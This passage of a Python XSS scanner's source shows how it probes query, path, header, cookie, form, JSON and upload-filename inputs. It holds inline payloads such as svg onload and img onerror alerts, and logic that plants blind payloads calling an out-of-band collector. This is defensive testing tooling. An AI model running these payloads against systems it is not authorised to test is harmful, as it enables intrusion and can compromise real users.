            # bug, three behaviours, none of them the request under test.
            fields = dict(pt.data)
            fields[pt.param] = sent
            out = pt.url
            for k, v in fields.items():
                out = set_query_param(out, k, v)
            return out, None, None
        return set_query_param(pt.url, pt.param, sent), None, None

    def send(self, pt: Point, value: str | None = None, label="inject") -> Response:
        """
        Single funnel for every injected request.  Appends `value` to the
        injection point's current value, places the result where it belongs
        (path, query, body or header), logs the exact payload sent at -v 2, and
        keeps the test counter honest.
        """
        sent = self.compose(value, pt) if value is not None else None
        target, body, extra = self._place(pt, sent)

        self.rep.debug(f"{label} | {pt.method} {target}")
        if sent is not None:
            self.rep.debug(f"  payload [{pt.label()}] len={len(sent)}: {sent}")
            note = wrap_note(sent, value)
            if note:
                self.rep.debug(f"    ({note})")
        if body:
            if isinstance(body, MultipartBody):
                shown = body.debug_text
            elif isinstance(body, JsonBody):
                shown = body.text
            else:
                shown = urllib.parse.urlencode(body)
            self.rep.debug("  body: " + shown)

        resp = self.req.request(target, method=pt.method, data=body,
                                extra_headers=extra)
        self.bump()
        if resp.ok:
            self.rep.debug(f"  -> {resp.status} {len(resp.body)}b {resp.elapsed:.2f}s")
        else:
            self.rep.debug(f"  -> failed: {resp.error}")

        if sent is not None:
            self._sql_check(resp, url=target, param=pt.name, location=pt.kind,
                            method=pt.method, payload=sent,
                            poc=(target if pt.method == "GET"
                                 and not (pt.header or pt.cookie) else ""))
        return resp

    def probe(self, pt: Point) -> tuple[str, Response, list[dict]]:
        """Send the canary probe and analyse where/how it comes back."""
        token = rand_token()
        # An encoded %2F in the path is rejected outright by some servers
        # (Apache AllowEncodedSlashes off), which would mask a real reflection -
        # so the path probe carries no slash.
        chars = PROBE_CHARS
        if pt.path_index is not None:
            chars = chars.replace("/", "")
        elif pt.cookie:
            # ';' ends a cookie value on the wire, so probing with it measures
            # the transport rather than the application -- measured on a
            # replica, everything in PROBE_CHARS reaches the page except that
            # one, which truncates the value where it stands.
            chars = chars.replace(";", "")
        resp = self.send(pt, probe_value(token, chars), label="probe")
        if not resp.ok or not resp.body:
            return token, resp, []
        refls = analyze_reflection(resp.doc, token)
        for r in refls:
            self.rep.debug(f"  reflection @{r['index']} ctx={r['context']} "
                           f"survived={''.join(sorted(r['survived'])) or 'none'} "
                           f"raw={r['raw']!r}")
        return token, resp, refls

    # -- payload attempts ----------------------------------------------------

    @staticmethod
    def _owns_attribute_value(body: str, payload: str) -> bool:
        """
        A javascript:/data: URL only executes when it starts the attribute
        value.  Injected into a path segment it lands as href="/app/javascript:..."
        - a relative URL that does nothing - so check what precedes it.
        """
        for m in re.finditer(re.escape(payload), body):
            if m.start() and body[m.start() - 1] in "\"'`=":
                return True
        return False

    @staticmethod
    def _payload_lands(body: str, payload: str, ptoken: str) -> bool:
        """The payload counts only if it comes back byte-for-byte unencoded."""
        if payload in body:
            return True
        # tolerate whitespace/case normalisation by the server-side templating
        return (re.sub(r"\s+", " ", payload) in re.sub(r"\s+", " ", body)
                and ptoken in body)

    @staticmethod
    def renders_html(resp) -> bool:
        """Would a browser render this response as a document?

        The question decides whether a reflection is an XSS at all. A payload
        echoed faithfully into an application/json body executes nothing: the
        browser parses it as data and shows nothing. Reporting that as a
        confirmed XSS is how a scanner fills a report with findings the client
        sends straight back -- measured on this very tool against a JSON API
        that echoes its input.

        A response with no Content-Type at all, or one that forbids sniffing,
        is judged on what it declares. A sniffable non-HTML type is a
        different question and is left to the operator.
        """
        ctype = ""
        for k, v in (resp.headers or {}).items():
            if k.lower() == "content-type":
                ctype = v.lower()
                break
        if not ctype:
            return True            # nothing declared: assume the worst
        return any(t in ctype for t in
                   ("text/html", "application/xhtml", "image/svg",
                    "text/xml", "application/xml"))

    def _finding_kind(self, pt: Point) -> str:
        if pt.path_index is not None:
            return "Path-based Reflected XSS"
        if pt.cookie:
            return "Cookie-based Reflected XSS"
        if pt.header:
            return "Header-based Reflected XSS"
        return "Reflected XSS"

    def _poc_for(self, pt: Point, sent: str) -> str:
        if pt.path_index is not None:
            return set_path_segment(pt.url, pt.path_index, sent)
        if pt.cookie:
            return ""
        if pt.method == "GET" and not pt.header and pt.data is None \
                and pt.param is not None:
            return set_query_param(pt.url, pt.param, sent)
        if pt.method == "GET" and not pt.header and pt.data is not None \
                and pt.param is not None:
            # GET form: all fields travel in the query string -> navigable PoC.
            #
            # MERGED into the URL's query, not appended to it. Appending was
            # the same bug _place had: a page reached with ?name=aaa whose
            # form field is also called name produced
            # ?name=aaa&id=qqqq&name=<payload>, and the PoC was a URL where
            # the parameter appears twice. The report showed a reproduction
            # that was not the request under test, and --confirm navigated it:
            # Werkzeug and every Servlet container read the FIRST occurrence,
            # so the browser was handed the clean value, no dialog fired, and
            # a finding the HTTP layer had just proved came back unverified.
            # That is why --confirm looked like it did nothing on form fields.
            fields = dict(pt.data)
            fields[pt.param] = sent
            out = pt.url
            for k, v in fields.items():
                out = set_query_param(out, k, v)
            return out
        return ""

    def _submit_for(self, pt: Point, sent: str) -> dict | None:
        """What a browser needs to reproduce a POST, or None.

        A POST has no navigable URL, so --confirm had nothing to load and
        every body finding was reported and then silently left unverified. A
        self-submitting form is both the reproduction and the real shape of
        the attack, so the body is carried along with the finding.

        JSON gets None on purpose: no HTML form can send application/json, so
        there is no form to submit and inventing one would confirm an
        execution path that does not exist.
        """
        if pt.method != "POST" or not getattr(self.args, "confirm", False):
            return None
        target, body, _ = self._place(pt, sent)
        if isinstance(body, MultipartBody):
            return {"url": target, "enctype": "multipart/form-data",
                    "fields": [{"name": p.name,
                                "value": "" if p.is_file else str(p.value),
                                "filename": p.filename,
                                "ctype": p.ctype,
                                # Capped: the whole thing is inlined into a
                                # page. The head is what a magic-byte check
                                # reads, and the filename is the payload here.
                                "b64": (base64.b64encode(p.value[:262144]).decode()
                                        if isinstance(p.value, bytes) else "")}
                               for p in body.parts]}
        if isinstance(body, dict):
            return {"url": target,
                    "enctype": "application/x-www-form-urlencoded",
                    "fields": [{"name": k, "value": v} for k, v in body.items()]}
        return None

    def try_payloads(self, pt: Point, refl: dict) -> bool:
        ptoken = rand_token()
        candidates = payloads_for(refl["context"], refl["quote"], ptoken)
        survived = refl["survived"]
        if pt.cookie:
            # A payload carrying ';' arrives truncated at the semicolon, so it
            # could not fire whatever the page does with it.
            keep = [c for c in candidates if ";" not in c[0]]
            if len(keep) != len(candidates):
                self.rep.debug(f"  cookie point: {len(candidates) - len(keep)} "
                               f"payload(s) dropped, ';' ends a cookie value")
            candidates = keep
        if pt.path_index is not None:
            # In a path, a space becomes %20 and won't fire on a server that
            # reflects the raw request path - so try space-free payloads first
            # (slashes are fine now that path metacharacters are sent raw).
            candidates = sorted(candidates, key=lambda pr: " " in pr[0])
        self.rep.debug(f"  {len(candidates)} candidate payload(s) for context "
                       f"'{refl['context']}' quote={refl['quote'] or 'none'}; "
                       f"survived chars: {''.join(sorted(survived)) or 'none'}")

        for payload, required in candidates:
            # skip payloads whose breakout chars are known to be filtered
            if any(c in PROBE_CHARS and c not in survived for c in required):
                self.rep.debug(f"  skip (needs {required!r}, filtered): {payload}")
                continue
            self.rep.test(f"  {pt.method} {pt.name} <- {payload}")
            resp = self.send(pt, payload, label="payload")
            if not resp.ok or not resp.body:
                continue
            if not self._payload_lands(resp.body, payload, ptoken):
                continue
            if is_standalone(payload) and \
                    not self._owns_attribute_value(resp.body, payload):
                self.rep.debug(f"  reflected but inert (scheme payload is not "
                               f"at the start of the value): {payload}")
                continue

            sent = self.compose(payload, pt)
            note = wrap_note(sent, payload)
            rendered = self.renders_html(resp)
            ctype = next((v for k, v in (resp.headers or {}).items()
                          if k.lower() == "content-type"), "(none)")
            self.add(Finding(
                kind=(self._finding_kind(pt) if rendered
                      else "Reflected input (response not rendered)"),
                url=pt.url, param=pt.name, location=pt.kind, method=pt.method,
                context=f"{refl['context']} ({refl['detail']})",
                payload=sent,
                evidence=(f"payload reflected unencoded, alert token {ptoken}"
                          + (f"; {note}" if note else "")
                          + ("" if rendered else
                             f"; served as {ctype}, which a browser does not "
                             f"render -- not an XSS on its own, but the input "
                             f"survives and may be rendered elsewhere")),
                poc=self._poc_for(pt, sent),
                submit=self._submit_for(pt, sent),
                confidence="confirmed" if rendered else "potential"))
            return True
        return False

    def _exercise(self, pt: Point, label: str, stop_at_first=True,
                  force=False) -> bool:
        """
        probe -> report reflections -> attempt payloads. Shared by the query,
        path, header and form vectors, which previously each had their own copy
        of this loop.

        stop_at_first controls what happens once a context yields a hit:

          False - keep going and report every vulnerable context for this input.
                  A parameter echoed into a JS string, an attribute and an HTML
                  body is three distinct breakouts needing three payloads.
          True  - one finding per injection point is enough.

        The two are kept because the original code did exactly this, differing by
        vector: query parameters reported every context, while path, header and
        form stopped at the first. That asymmetry is preserved here rather than
        silently unified - changing which findings a scanner reports is a
        detection change, not a refactor.

        force skips the usual gate. The gate asks "which of my probe
        characters came back?", and on a file upload almost nothing does: the
        response to the upload is a redirect, a JSON receipt or a page that
        names the file and nothing else, so the probe measures nothing and the
        point is dropped before a single payload is sent. That is the wrong
        answer for the one surface where the payload most often fires
        somewhere else entirely -- an admin file list, a gallery, a log
        viewer. So the payloads go out regardless of what survived, and with
        -b the out-of-band payload is planted too, because out-of-band is the
        shape this surface actually gets caught by.
        """
        token, resp, refls = self.probe(pt)
        if not resp.ok:
            self.rep.debug(f"no response for {label}: {resp.error}")
            return False
        if not refls and not force:
            self.rep.test(f"  {label}: no reflection ({resp.status})")
            return False
        hit = False
        for r in refls:
            self.rep.info(f"  {label}: reflected in {r['context']} - {r['detail']} "
                          f"| survived: {''.join(sorted(r['survived'])) or 'none'}")
            if not r["survived"]:
                continue
            if self.try_payloads(pt, r):
                hit = True
                if stop_at_first:
                    return True
        if hit or not force:
            return hit

        self.rep.test(f"  {label}: nothing measurable came back ({resp.status}) "
                      f"- payloads sent anyway")
        forced = dict(refls[0]) if refls else {"context": "html", "quote": ""}
        forced["detail"] = "forced, no reflection measured"
        forced["survived"] = set(PROBE_CHARS)
        hit = self.try_payloads(pt, forced)
        if self.args.blind:
            self._plant(pt, "upload", self.args.blind)
        return hit

    # -- vectors -------------------------------------------------------------

    def test_query_param(self, url: str, param: str):
        self.rep.test(f"GET {param} @ {url}")
        # every vulnerable context, not just the first - see _exercise
        self._exercise(Point(url, param=param), param, stop_at_first=False)
        if self.args.test_param_name:
            # The NAME, not the value. A page that echoes the parameters it
            # did not expect -- a debug dump, a strict API, an "unknown field"
            # message -- is only reachable this way.
            self.rep.test(f"GET {param} NAME @ {url}")
            self._exercise(Point(url, param=param, inject_name=True),
                           f"{param} (name)")
        if not self.args.no_json:
            self._query_param_json(url, param)

    def _query_param_json(self, url: str, param: str):
        """A query parameter whose VALUE is a JSON document.

        ?filter={"q":"shoes"} is as common as a JSON body, and injecting into
        the parameter as a whole destroys the document -- the application fails
        to parse it and answers an error, so the test measures the error path.
        Walking the tree inside it reaches the leaves the application actually
        reads.
        """
        raw = ""
        for k, v in urllib.parse.parse_qsl(
                urllib.parse.urlsplit(url).query, keep_blank_values=True):
            if k == param:
                raw = v
                break
        if not raw.lstrip().startswith(("{", "[")):
            return
        try:
            tree = json.loads(raw)
        except ValueError:
            return
        leaves = json_leaves(tree)
        if not leaves:
            return
        self.rep.info(f"  {param} carries JSON: "
                      f"{', '.join(p for p, _, _ in leaves[:8])}")
        specs = self.wanted()
        for path, _value, kind in leaves:
            if not self._json_selected(path, specs) and not any(
                    sp.name.lower() == param.lower() for sp in specs):
                continue
            if kind != "str":
                self.rep.test(f"  {param}:{path}: {kind} leaf, it becomes a "
                              f"string once it carries a payload")
            self._exercise(Point(url, param=param, json_body=tree,
                                 json_path=path),
                           f"{param}:{path}")

    def test_path(self, url: str):
        """
        Inject into the URL path itself: each existing segment, plus one extra
        segment appended to the end.  Error pages, breadcrumbs, canonical links
        and 404 handlers routinely echo the path straight back.
        """
        segs = path_segments(url)
        # last segments first - they are the ones most often echoed - and cap
        # the count so a deep path doesn't explode the request budget
        indexes = list(range(len(segs)))[-self.args.max_path_segments:]
        indexes.append(len(segs))          # the appended-segment case
        for i in indexes:
            label = f"path[{i}]" if i < len(segs) else "path[+]"
            current = segs[i] if i < len(segs) else "(new segment)"
            self.rep.test(f"GET {label} @ {url} (current: {current})")
            self._exercise(Point(url, path_index=i), label)

    def test_headers(self, url: str, headers=None, cookies=None):
        for h in (INJECTABLE_HEADERS if headers is None else headers):
            self.rep.test(f"header {h} @ {url}")
            self._exercise(Point(url, header=h), h)
        jar = self.cookie_jar(url)
        for c in (cookies or []):
            self.rep.test(f"cookie {c} @ {url}")
            self._exercise(Point(url, cookie=c, jar=jar), c)

    def cookie_jar(self, url: str) -> dict:
        """The cookies the request carries, from -H or from the capture."""
        return parse_cookie_header(self.req.header_for(url, "Cookie"))

    # ---- -p selection

    def wanted(self) -> list:
        """Specs given with -p. An empty list means 'test everything'."""
        return parse_param_specs(getattr(self.args, "param", None) or "")

    def select(self, url: str, params: list, forms: list):
        """
        Resolve every vector for this URL against -p.

        Returns (params, forms, headers, cookies). With no -p, headers and
        cookies follow --headers and the rest is what the request carries. With
        -p, only what is named is tested -- in the place the prefix says, and
        created there when the request does not carry it, which is how a
        parameter you know about but that is not in the capture is reached.
        """
        specs = self.wanted()
        jar = self.cookie_jar(url)
        hdr_on = getattr(self.args, "headers", False)
        no_cookies = getattr(self.args, "no_cookies", False)

        if not specs:
            # Nothing an auth file supplies is injected: the payload would
            # replace the credential and every later request would run
            # unauthenticated, which looks exactly like a target with no
            # vulnerability. -p overrides this, name by name.
            auth_h = self.req.auth.names_for(url) if self.req.auth else set()
            auth_c = self.req.auth.cookies_for(url) if self.req.auth else set()
            headers = ([h for h in INJECTABLE_HEADERS if h.lower() not in auth_h]
                       if hdr_on else [])
            cookies = ([] if (not hdr_on or no_cookies)
                       else [c for c in jar if c not in auth_c])
            held = (len(INJECTABLE_HEADERS) - len(headers)) if hdr_on else 0
            held += len(auth_c & set(jar)) if (hdr_on and not no_cookies) else 0
            if held:
                self.rep.info(f"{held} point(s) held back — supplied by an "
                              f"auth file; name one with -p to test it anyway")
            if cookies:
                self.rep.info(f"{len(cookies)} cookie(s) to test one at a "
                              f"time: {', '.join(cookies)}")
            return params, forms, headers, cookies, None

        known = {h.lower(): h for h in INJECTABLE_HEADERS}
        sel_params, sel_headers, sel_cookies = [], [], []
        field_names = set()
        for f in forms:
            field_names.update(f.selectable())

        for sp in specs:
            kind = sp.kind
            if not kind:
                if any(sp.matches("query", p) for p in params):
                    kind = "query"
                elif any(sp.matches("body", n) for n in field_names):
                    kind = "body"
                elif any(sp.matches("cookie", c) for c in jar):
                    kind = "cookie"
                elif sp.key in known or "-" in sp.key:
                    kind = "header"
                else:
                    kind = "query"
            if kind == "query":
                sel_params.append(sp.name)
                if sp.name not in params:
                    self.rep.info(f"  -p: query parameter '{sp.name}' is not "
                                  f"on the target — adding it to the query "
                                  f"string")
            elif kind == "header":
                h = known.get(sp.key, sp.name)
                sel_headers.append(h)
                self.rep.info(f"  -p: testing request header {h} (--headers "
                              f"not needed for a header named here)")
            elif kind == "cookie":
                if sp.name not in jar:
                    self.rep.info(f"  -p: cookie '{sp.name}' is not in the "
                                  f"request — sending it anyway")
                sel_cookies.append(sp.name)

        only = {n for n in field_names
                if any(sp.matches("body", n) for sp in specs)}
        sel_forms = [f for f in forms if only & set(f.selectable())]

        # A body field the request does not carry is created, the way a query
        # parameter or a cookie is: -p names what the tester knows about, and
        # an endpoint that accepts a field without advertising it in a form is
        # the normal case for an API.
        for sp in specs:
            if sp.kind != "body" or sp.name in field_names:
                continue
            self.rep.info(f"  -p: body parameter '{sp.name}' is not in the "
                          f"request — adding it")
            sel_forms.append(Form(action=url, method="POST",
                                  enctype="application/x-www-form-urlencoded",
                                  inputs={sp.name: ""},
                                  types={sp.name: "text"}))
            only = only | {sp.name}
        dropped = (len(params) - len(set(params) & set(sel_params))
                   + len(field_names - only))
        if dropped > 0:
            self.rep.info(f"  -p: {dropped} other injection point(s) skipped")
        return sel_params, sel_forms, sel_headers, sel_cookies, only

    @staticmethod
    def _form_point(form: Form, action: str, method: str, name: str,
                    **kw) -> Point:
        """The injection point for one field of this form, encoded the way the
        form says it is submitted.

        One place decides it, because getting the encoding right in test_form
        and wrong in test_blind would mean -b plants payloads a multipart
        endpoint never reads, and reports nothing while looking like it
        covered the surface.
        """
        if form.is_multipart:
            return Point(action, param=name, method=method,
                         parts=tuple(form.parts()), boundary=form.boundary,
                         **kw)
        return Point(action, param=name, method=method,
                     data=form.field_values(), **kw)

    def test_form(self, page_url: str, form: Form, only=None):
        action, method = form.resolved(page_url)
        mp = form.is_multipart
        self.rep.info(f"form {method} {action} "
                      f"fields={list(form.field_values())}"
                      + (" (multipart/form-data)" if mp else ""))

        for name in form.injectable():
            if only is not None and name not in only:
                continue
            self.rep.test(f"{method} form field {name} @ {action}")
            pt = self._form_point(form, action, method, name)
            token, resp, refls = self.probe(pt)
            if not resp.ok or not resp.body:
                continue
            if not refls:
                # nothing in the immediate response - check for storage
                self._check_stored(page_url, pt, token)
                continue
            for r in refls:
                self.rep.info(f"  {name}: reflected in {r['context']} | "
                              f"survived: {''.join(sorted(r['survived'])) or 'none'}")
                if r["survived"] and self.try_payloads(pt, r):
                    break

        if self.args.test_param_name:
            # The field NAMES, after the values. Same reasoning as the query
            # vector: an application that echoes a field it does not recognise
            # is reachable no other way. selectable() rather than injectable()
            # because a file part has a name like any other, even though its
            # value is bytes nobody renders.
            for name in form.selectable():
                if only is not None and name not in only:
                    continue
                self.rep.test(f"{method} form field {name} NAME @ {action}")
                self._exercise(self._form_point(form, action, method, name,
                                                inject_name=True),
                               f"{name} (name)")

            # An upload's FILENAME is a name too, and the one an upload page
            # is most likely to print back. Forced: see _exercise.
            for fn in form.file_names():
                if only is not None and fn not in only:
                    continue
                self.rep.test(f"{method} part {fn} FILENAME @ {action}")
                self._exercise(self._form_point(form, action, method, fn,
                                                part_filename=True),
                               f"{fn} (filename)", force=True)

    def _check_stored(self, page_url: str, pt: Point, token: str):
        """Submit a marker, then re-fetch the origin page looking for persistence."""
        marker = f"{token}<svg/onload=alert('{token}')>"
        self.send(pt, marker, label="stored")
        marker = self.compose(marker, pt)

        again = self.req.request(page_url)
        self.bump()
        self._sql_check(again, url=page_url, param=pt.name, location="stored",
                        method="GET", payload=marker)
        self.rep.debug(f"stored re-fetch {page_url} -> {again.status} "
                       f"{len(again.body)}b; marker {token} "
                       f"{'present' if token in again.body else 'absent'}")
        if not (again.ok and token in again.body):
            return
        confirmed = "<svg/onload=" in again.body
        self.add(Finding(
            kind="Stored XSS" if confirmed else "Stored input (needs review)",
            url=page_url, param=pt.name, location="body", method=pt.method,
            context="value persisted and rendered on " + page_url,
            payload=marker,
            evidence=("payload persisted unencoded" if confirmed
                      else "input persisted but HTML-encoded"),
            poc=page_url,
            confidence="confirmed" if confirmed else "potential"))

    @staticmethod
    def _json_selected(path: str, specs) -> bool:
        """Does -p name this leaf?

        Three spellings, because the operator should not have to know the
        document to aim at it: the full path (meta.tags[0]), the leaf name on
        its own (bio), and either under json: or body: -- a JSON body is the
        body. A spec aimed at the query, a cookie or a header never selects a
        leaf.
        """
        if not specs:
            return True
        leaf = path.rsplit(".", 1)[-1]
        for sp in specs:
            if sp.kind not in ("", "json", "body"):
                continue
            want = sp.name.lower()
            if want in (path.lower(), leaf.lower()):
                return True
        return False

    def test_json(self, url: str, tree, method: str = "POST", only=None):
        """Every leaf of a JSON body, one at a time.

        The body is rebuilt around each leaf and re-serialised, so the escaping
        is correct by construction rather than by hand: a payload carrying a
        quote or a backslash comes out of json.dumps already escaped, and the
        application decodes it back before echoing it.

        Containers are skipped. Keys are skipped unless --test-param-name:
        renaming a field usually buys a validation error rather than a
        reflection, which is a different measurement.
        """
        leaves = json_leaves(tree)
        if not leaves:
            self.rep.warn(f"JSON body with no leaf to inject into: {url}")
            return
        self.rep.info(f"JSON body {method} {url}: "
                      f"{len(leaves)} leaf/leaves "
                      f"({', '.join(p for p, _, _ in leaves[:8])}"
                      f"{'...' if len(leaves) > 8 else ''})")

        specs = self.wanted()
        wanted_leaves = [p for p, _, _ in leaves
                         if self._json_selected(p, specs)]
        if specs and not wanted_leaves:
            # A warning, not an info line. At -v 0 this used to be complete
            # silence: the run did nothing, the summary said zero findings,
            # and nothing distinguished "this target is clean" from "-p names
            # a field that does not exist". Printing what IS there turns a
            # dead end into an answer.
            self.rep.warn(
                "-p matches no JSON leaf in this body, so none was tested. "
                "Available: " + ", ".join(p for p, _, _ in leaves))
            return
        if specs:
            self.rep.info(f"  -p selects {len(wanted_leaves)} of {len(leaves)} "
                          f"leaf/leaves: {wanted_leaves}")

        for path, value, kind in leaves:
            if path not in wanted_leaves:
                continue
            if kind != "str":
                self.rep.test(f"  {path}: {kind} leaf, it becomes a string "
                              f"once it carries a payload")
            pt = Point(url, method=method, json_body=tree, json_path=path)
            if not self._exercise(pt, f"json {path}"):
                # Nothing in the immediate response. An API that stores what it
                # is given and renders it somewhere else is the usual shape, so
                # the stored check runs here as it does for forms.
                token, resp, refls = self.probe(pt)
                if resp.ok and not refls:
                    self._check_stored(url, pt, token)

        if self.args.test_param_name:
            for path, _value, _kind in leaves:
                if path.endswith("]"):
                    continue          # a list element has no name
                if path not in wanted_leaves:
                    continue
                pt = Point(url, method=method, json_body=tree,
                           json_path=path, json_name=True)
                self._exercise(pt, f"json key {path}")

    def test_dom(self, url: str, page: FormParser):
        """
        Static source->sink analysis. `page` is the already-parsed landing page:
        parsing it again here was duplicated work on every target.
        """
        blobs = [("inline script", s) for s in page.inline]

        # Filter FIRST, then cap. The other order spent the budget on scripts
        # that were never going to be fetched: a page listing its CDN tags
        # before its own code -- which is the usual order -- used up all ten
        # slots on third parties, every one of them skipped, so not a single
        # same-origin script was read and the DOM pass quietly degraded to
        # inline-only. Measured on a representative tag list: zero fetched
        # before, two after.
        origin = urllib.parse.urlsplit(url).netloc
        own = []
        for src in page.scripts:
            full = urllib.parse.urljoin(url, src)
            if urllib.parse.urlsplit(full).netloc != origin:
                self.rep.debug(f"skip third-party script {full}")
                continue
            own.append(full)
        if len(own) > self.args.max_scripts:
            self.rep.info(f"{len(own)} same-origin scripts, fetching the "
                          f"first {self.args.max_scripts} (--max-scripts)")
        for full in own[: self.args.max_scripts]:
            r = self.req.request(full)
            self.bump()
            if r.ok and r.body:
                blobs.append((full, r.body))

        for label, js in blobs:
            for source, sink, snippet in scan_dom(js):
                self.rep.info(f"DOM source {source} -> sink {sink} in {label}")
                self.add(Finding(
                    kind="DOM XSS (source -> sink)",
                    url=url, param=source, location="fragment/dom", method="GET",
                    context=f"{label}: {source} flows toward {sink}",
                    payload=f"{url.split('#')[0]}#<img src=x onerror=alert(1)>",
                    evidence=snippet[:220],
                    confidence="potential"))

        # fragment / hash-driven reflection: does the server-side even see it?
        token = rand_token()
        frag_payload = f"{token}<svg/onload=alert(1)>"
        frag_url = f"{url.split('#')[0]}#{frag_payload}"
        self.rep.debug(f"dom-fragment | GET {frag_url}")
        self.rep.debug(f"  payload [location.hash (fragment)] "
                       f"len={len(frag_payload)}: {frag_payload}")
        r = self.req.request(frag_url)
        self.bump()
        if r.ok and token in r.body:
            self.add(Finding(
                kind="DOM XSS (fragment reflected)",
                url=url, param="location.hash", location="fragment", method="GET",
                context="fragment value observed in the rendered document",
                payload=frag_url, evidence="hash token present in response body",
                confidence="potential"))

    def test_blind(self, url: str, params: list[str], forms: list[Form],
                   headers=None, cookies=None, only=None):
        """
        Plant OOB payloads at every injection point still enabled.

        The switches gate this the same way they gate the reflected tests, and
        so does -p: the vectors are the ones already resolved for this URL.
        They used to be ignored here, so `-b …` still planted into all twelve
        headers whatever was asked for. A switch that silences one vector has
        to silence it for every technique, or it is not a switch.
        """
        cb = self.args.blind
        if not cb:
            return
        self.rep.banner(f"Blind XSS (OOB -> {cb})")

        planted = False
        if not self.args.no_reflected:
            for p in params:
                self._plant(Point(url, param=p), "query", cb)
                planted = True
        else:
            self.rep.info("  blind: query parameters skipped (--no-reflected)")

        jar = self.cookie_jar(url)
        for h in (headers or []):
            self._plant(Point(url, header=h), "header", cb)
            planted = True
        for c in (cookies or []):
            self._plant(Point(url, cookie=c, jar=jar), "cookie", cb)
            planted = True
        if not (headers or cookies):
            self.rep.info("  blind: headers and cookies skipped "
                          "(--headers not given)")

        if not self.args.no_forms:
            for form in forms:
                action, method = form.resolved(url)
                for name in form.injectable():
                    if only is not None and name not in only:
                        continue
                    self._plant(self._form_point(form, action, method, name),
                                "form", cb)
                    planted = True
        else:
            self.rep.info("  blind: forms skipped (--no-forms)")

        if not planted:
            self.rep.warn("blind XSS requested but every injection vector is "
                          "disabled — nothing was planted")

    def _plant(self, pt: Point, kind: str, cb: str):
        with self.lock:
            # Six characters is 2 billion tags, but a collision would misfile a
            # callback, so take the exact check rather than the odds.
            tag = blind_tag()
            while tag in self.blind_map:
                tag = blind_tag()
            self.blind_map[tag] = {"url": pt.url, "param": pt.name,
                                   "method": pt.method, "kind": kind,
                                   "host": blind_authority(cb, tag),
                                   "time": time.strftime("%Y-%m-%d %H:%M:%S")}
        label = f"{BLIND_LABEL}{tag}"
        # The target's own scheme, unless -b or --force-ssl overrides it.
        scheme = blind_scheme(cb, pt.url, getattr(self.args, "force_ssl", False))
        self.blind_map[tag]["scheme"] = scheme
        payloads = blind_payloads(cb, tag, scheme)
        plants, echoed = [], 0
        for pl in payloads:
            # -v 1 truncates for readability, -v 2 logs the payload in full
            self.rep.test(f"blind {kind} {pt.name} <- {pl[:70]}"
                          f"{'...' if len(pl) > 70 else ''}")
            resp = self.send(pt, pl, label=f"blind:{tag}")

            # Record the exact reproduction so --confirm can replay it in a real
            # browser.  Planting over HTTP only *stores* the payload; nothing
            # renders it, so on a reflected point (DVWA's ?ip= is the textbook
            # case) the collector would never be called - which is precisely the
            # bug this reporting closes.
            sent = self.compose(pl, pt)
            target, body, extra = self._place(pt, sent)
            # Match the whole label, not the six-character tag alone: six
            # random characters turn up in a long page by accident.
            back = label in (resp.body or "")
            echoed += back
            plants.append({"tag": tag, "payload": pl, "sent": sent,
                           "url": target, "method": pt.method, "body": body,
                           "headers": extra, "echoed": back})

        if echoed:
            self.rep.info(f"  blind {kind} {pt.name}: {echoed}/{len(payloads)} "
                          f"payload(s) came back in the response - replayable "
                          f"in the browser")
        self.add(Finding(
            kind="Blind XSS payload planted",
            url=pt.url, param=pt.name, location=pt.kind, method=pt.method,
            context=f"OOB {blind_authority(cb, tag)}",
            payload=f"{len(payloads)} payloads calling {blind_authority(cb, tag)}",
            evidence="check your collector (DNS or HTTP) for this hostname",
            confidence="planted", plants=plants))

    # -- orchestration -------------------------------------------------------

    def preflight(self, url: str, method: str = "GET",
                  data: dict | None = None) -> Response | None:
        """
        Confirm the target actually serves something before spending tests on
        it.  A 3xx, a 5xx or a transport failure is retried up to
        PREFLIGHT_TRIES times; if none of the attempts land, the URL is skipped
        entirely.  4xx counts as alive - a 404 page still reflects input, and
        path injection lives there.

        method/data let a raw-request scan (-r) fetch its baseline with the same
        verb and body as the captured request, so a POST-only endpoint is not
        wrongly skipped on a GET preflight.
        """
        last = ""
        for attempt in range(1, PREFLIGHT_TRIES + 1):
            resp = self.req.request(url, method=method, data=data)
            if resp.ok and not (300 <= resp.status < 400) and resp.status < 500:
                if attempt > 1:
                    self.rep.info(f"{url}: answered on attempt {attempt}")
                if resp.url != url:
                    self.rep.info(f"{url}: redirected to {resp.url}")
                return resp
            last = resp.error or f"HTTP {resp.status}"
            self.rep.warn(f"{url}: attempt {attempt}/{PREFLIGHT_TRIES} "
                          f"failed ({last})")
            if attempt < PREFLIGHT_TRIES:
                time.sleep(PREFLIGHT_BACKOFF * attempt)
        with self.lock:
            self.skipped.append({"url": url, "reason": last})
        self.rep.skip(f"{url} - no usable response after {PREFLIGHT_TRIES} "
                      f"attempts ({last}); all tests skipped for this URL")
        return None

    def _report_baseline(self, url: str, base: Response):
        if self.args.no_sql:
            return
        pre = self.sql.learn_baseline(url, base)
        if pre:
            self.rep.warn(f"baseline page already leaks DB errors: "
                          f"{', '.join(sorted(pre))}")
        self._sql_check(base, url=url, param="-", location="baseline",
                        method="GET", poc=url)

    def scan(self, url: str):
        self.rep.banner(f"Scanning {url}")
        base = self.preflight(url)
        if base is None:
            return
        self.rep.info(f"{base.status} {base.header('Content-Type', '?')} "
                      f"{len(base.body)} bytes  ({base.elapsed:.2f}s)")

        # Record which DB errors the page already leaks, so later alerts can say
        # whether the payload caused it or the page was broken to begin with.
        self._report_baseline(url, base)

        csp = base.header("Content-Security-Policy")
        self.rep.info(f"CSP present: {csp[:160]}" if csp
                      else "no Content-Security-Policy header")

        query = urllib.parse.urlsplit(url).query
        params = list(dict.fromkeys(
            k for k, _ in urllib.parse.parse_qsl(query, keep_blank_values=True)))
        page = parse_page(base.body)

        params, forms, headers, cookies, only = self.select(
            url, params, page.forms)
        named = bool(self.wanted())

        self._tls.verified = 0     # reset per-URL browser-confirmed counter
        try:
            if not self.args.no_reflected:
                for p in params:
                    self.test_query_param(url, p)
            if not self.args.no_path and not named:
                self.test_path(url)
            if not self.args.no_forms:
                for form in forms:
                    self.test_form(url, form, only)
            if headers or cookies:
                self.test_headers(url, headers, cookies)
            if not self.args.no_dom and not named:
                self.test_dom(url, page)

            self.test_blind(url, params, forms, headers, cookies, only)
        except _StopURL as e:
            self.rep.info(f"{url}: {e.args[0]} finding(s) confirmés en navigateur "
                          f">= --confirm-x ({self.args.confirm_x}) - tests restants "
                          f"ignorés pour cette URL")

    def scan_request(self, spec: "RequestSpec"):
        """
        Scan piloté par une requête HTTP brute (-r).

        Même moteur et mêmes vecteurs que scan(), gouvernés par les mêmes
